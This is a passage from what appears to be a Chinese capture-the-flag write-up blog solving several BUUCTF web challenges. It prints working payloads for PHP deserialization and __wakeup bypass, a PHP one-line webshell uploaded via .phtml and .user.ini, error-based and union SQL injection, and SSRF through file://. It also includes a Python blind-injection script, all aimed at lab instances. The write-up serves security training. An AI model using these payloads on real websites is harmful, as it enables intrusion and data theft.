class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在index.php查看源码，通过select传参，存在反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题的序列化，相比以前多了一个private，这个与全局变量形成对比，表示私有字段，只在所声明的类中可见，所以这里序列化的结果前面有类名，</p><p><img src="buu/20.png"></p><p>从图片中可以看出类名和字段名前面都有个符号，原来，私有字段的字段名在序列化时，属性名和属性值前面都会加上0的前缀。发现这里的字符串数为14，明显多了。</p><p>由于在url，所以我们构造%00，成功绕过，记得修改属性个数大于实际属性个数，可以绕过函数wake_up()。</p><p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><p>获得flag。</p><p><img src="buu/21.png"></p><p><strong>本题关键：通过定义私有变量private构造序列化来满足题目要求的值，并修改属性个数的值大于实际属性个数，绕过wake_up()函数。</strong></p><p>补充：</p><p>也可以通过python提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import  requests</span><br><span class="line"></span><br><span class="line">url =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;</span><br><span class="line">html = requests.get(url+&#x27;?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;&#x27;)</span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><p>这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。所以会导致，上面复制不了。</p><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>新学了一些文件名绕过姿势：phtml</p><p>这里要注意：需要 <strong>apache</strong>支持解析 <strong>phtml</strong></p><p>该文件类型可以执行php代码。</p><p>注意这四个地方，即可上传成功并执行一句话木马。</p><p><img src="buu/22.png"></p><p><strong>本题关键：后缀名为phtml的一句话木马。</strong></p><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这题我做的很离谱，找到登陆页面，直接输入用户名admin，密码就随便输了个123，就得到flag了，很巧合。</p><p>百度了一下，本题有三种解法哈哈哈，总结一下，这里可能是服务器端出现问题了。</p><p>这里没办法复现，参考一下大佬的文章。</p><p><a href="https://www.jianshu.com/p/f92311564ad0">https://www.jianshu.com/p/f92311564ad0</a></p><h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p>看到学生要来自CUIT，刚开始以为是添加Referer字段，结果试了很多次都不行，这里好好观察一下cookie值。</p><p><img src="buu/24.png"></p><p>改成user=1即可，然后说数字过长了。</p><p>通过数组绕过，得到flag。</p><p><img src="buu/25.png"></p><p>或者使用科学计数法，</p><p><img src="buu/26.png"></p><p><strong>本题关键：科学计数法或数组绕过长度限制。</strong></p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>请求头发现提示。</p><p><img src="buu/27.png"></p><p>首先看一下md5函数的语法，</p><p><a href="https://www.w3school.com.cn/php/func_string_md5.asp">https://www.w3school.com.cn/php/func_string_md5.asp</a></p><p><img src="buu/28.png"></p><p>当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，对应的字符就是ffifdyop，解出这个字符串需要脚本，还不大会。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop</span><br></pre></td></tr></table></figure><p>这里后台的sql语句是：<code>$sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code></p><p>我们要绕过md5就需要得到sql语句:</p><p><code>$sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and **1**;</code></p><p>这样就可以查到名为admin的数据</p><p>想返回1，利用MySQL一些语法特性：</p><p><img src="buu/29.png"></p><p>测试了一下，前面为非0数字结果返回就为1。</p><p>输入密码 ffifdyop，</p><p>经md5后返回，前面返回有’’ or ‘6，可以满足永真式。</p><p>跳转到 levels91.php</p><p>查看源码，直接通过数组绕过。</p><p>分别通过get和post提交参数。</p><p><img src="buu/30.png"></p><p><strong>本题关键：找到md5后能返回永真式的字符串，同万能密码一样。</strong></p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>本题绕过了文件内容，文件类型，还有文件名检查，成功上传了图片，但是没办法执行一句话木马。</p><p>这里我们想到了upload的**.user.ini** 文件和**.htaccess**文件,先试一下第一个</p><p>我们上传内容为GIF89A auto_prepend_file=1.jpg的.user.ini文件，然后再上传一个名为1.jpg的一句话木马。</p><p><img src="buu/31.png"></p><p><img src="buu/32.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="tag">&lt;<span class="name">script</span> <span class="attr">lanuage</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="number">1</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>连接蚁剑发现了一个文件/clean.sh，所以这里操作要快，不然上传的文件会被删除，</p><p><img src="buu/33.png"></p><p>连接的时候后面接上index.php。</p><p>为什么后面要加上index.php呢，查看源码，发现</p><p><img src="buu/34.png"></p><p>看了一下源码，没过滤好.htaccess，因为少了一个c，但是上传了，也解析不了，为什么？</p><p>因为<code>.htaccess</code>只适用于apache，看了一下服务器使用的中间件是nginx，.user.ini适用于nginx/apache/IIS。</p><p><img src="buu/35.png"></p><p><strong>本题关键：上传.user.ini文件</strong></p><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>关键函数file_get_contents()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">php <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先要读取文件内容，需要使用到php伪协议，加密的时候不要加双引号。</p><p><img src="buu/36.png"></p><p>再读取useless.php文件内容：</p><p><img src="buu/37.png"></p><p>base64解码得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的file是可控的，我们修改成我们需要的然后进行序列化。</p><p><img src="buu/38.png"></p><p>这里还要给file赋值useless.php,文件包含的是useless.php。</p><p><img src="buu/39.png"></p><p>最后payload：</p><p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>f12就找到flag了。</p><p><strong>本题关键：PHP伪协议，序列化修改可控参数读取文件。</strong></p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>感觉这题又是盲注了，测试了一下，ascii，substr，&lt;&gt;，^没有被过滤。</p><p>跟前面写的脚本原理类似。放脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://2a70cf02-c4db-4a3c-97f6-7d7ed7322427.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url,data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)<span class="comment">#防止访问过限</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">max</span>=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span>=s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>)&lt;=<span class="number">1</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>首先输入一个单引号出现报错，并且在密码附近，所以注入点应该在密码。</p><p>再测试一下，发现符号||被过滤了，我们可以用异或符号代替，^，这个方法很好用。</p><p>使用函数updatexml()实现报错注入。</p><p><img src="buu/40.png"></p><p>爆出数据库，然后通过括号绕过空格过滤，用like代替=，爆出数据表。</p><p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),1)%23</code></p><p><img src="buu/41.png"></p><p>爆出字段名</p><p><img src="buu/42.png"></p><p>爆出flag。</p><p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c,(select(group_concat(id,username,password))from(H4rDsq1))),1)%23</code></p><p><img src="buu/43.png"></p><p>好像还有一半，我们想用limit函数查一下，但是加了括号函数就会报错，可以使用left()right()语句查询拼接。</p><p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c(select(group_concat(right(password,30)))from(H4rDsq1))),1)%23</code></p><p><img src="buu/44.png"></p><p>最后拼接得到flag。</p><p><strong>本题关键：异或报错注入，like代替=绕过空格，left和right函数使用。</strong></p><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>先注册一个，然后发现用户名可以点击，跳转新的url，url末尾通过?no=传参。</p><p>尝试爆破一下数字，返回结果一样，试一下有没有sql注入。</p><p>习惯性加了单引号，报错，我们再加注释，还是报错，本题有可能是数字型的。</p><p>输入：</p><p><code>?no=1 order by 4</code></p><p><code>?no=1 order by 5</code>报错，判断得出字段数为4。</p><p>直接爆库，发现存在waf，这里get了新姿势，通过/**/绕过空格的</p><p><code>?no=-1/**/union/**/select/**/1,database(),3,4</code></p><p>这里选择字段2，因为字段2在页面才有回显，爆出库名为fakebook </p><p><img src="buu/45.png"></p><p>查表：</p><p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),3,4</code></p><p>得到表users，这里一般后面不直接接库名，不然怕还有waf。</p><p>接着爆出字段名，</p><p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;),3,4</code></p><p>先爆几个比较重要的字段。</p><p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(username,passwd,data)from/**/users),3,4</code></p><p><img src="buu/46.png"></p><p>看见序列化，这里并没有flag，应该还有别的页面，跑一下目录。</p><p>扫到robots.txt，访问一下，user.php.bak，下载源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看一下data数据的内容：O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:15;s:4:”blog”;s:16:”sadasd.github.io”;}</p><p>还记得前面报错有出现unserialize()函数，我们这里需要对什么进行序列化？</p><p>很明显跟博客地址有关系，再看看一开始的图片，相当于把这个图片内容打印出来，我们可以通过这个方式读取flag。</p><p><img src="buu/47.png"></p><p>由于blog在字段4，我们就在字段4构造序列化，通过file://读取文件造成ssrf漏洞,(<strong>序列化后传入，系统将其反序列化，我们成功传入值会被传递到页面ifram里面 这样就造成SSRF攻击</strong>)</p><p><code>?no=-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:15;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p><p>返回了内容，通过burp查看，</p><p><img src="buu/48.png"></p><p>这题是sql注入和ssrf注入漏洞结合。</p><p><strong>本题关键：数字型注入，注释符代替空格，序列化ssrf攻击。</strong></p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p><img src="buu/49.png"></p><p><strong>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</strong></p><p><strong>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。</strong></p><p><strong>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</strong>  <em><strong>一般看后缀有个=就很好区别出来。</strong></em></p><p><em>看见源码有内容，先base32解码，再进行base64解码，得到sql语句。</em></p><p><code>select * from user where username = &#39;$name&#39;**</code></p><p>可以知道表名是user，单引号注入型。</p><p>union和select都被过滤了，get新姿势，直接盲猜字段数量。</p><p><img src="buu/50.png"></p><p>再输入3，没报字段数错误，可以得到字段数为3。</p><p><img src="buu/51.png"></p><p>括号被过滤了，很难受。想不到其他办法，测试耗时间，直接源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">function stripslashes_deep($value)</span><br><span class="line">&#123;</span><br><span class="line">$value = is_array($value) ?</span><br><span class="line">array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">stripslashes($value);</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;//过滤</span><br><span class="line">die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line">// print_r($arr);</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">if(md5($password) == $arr[2])&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong pass!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong user!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>知识点：MySQL在查询数据不存在时，联合查询会构造一个虚拟的数据在数据库中。</p><p><img src="buu/52.png"></p><p>这里两个条件，返回三个字段数据，第一个if要求字段2数据为“admin”</p><p>第二个if要求password经md5加密=字段3的数据。</p><p>构造payload：</p><p><code>name=-admin&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; %23&amp;pw=123</code></p><p><img src="buu/53.png"></p><p><strong>本题关键：MySQL查询数据，不存在会自动创建一个虚拟的数据在数据库中。</strong></p><h3 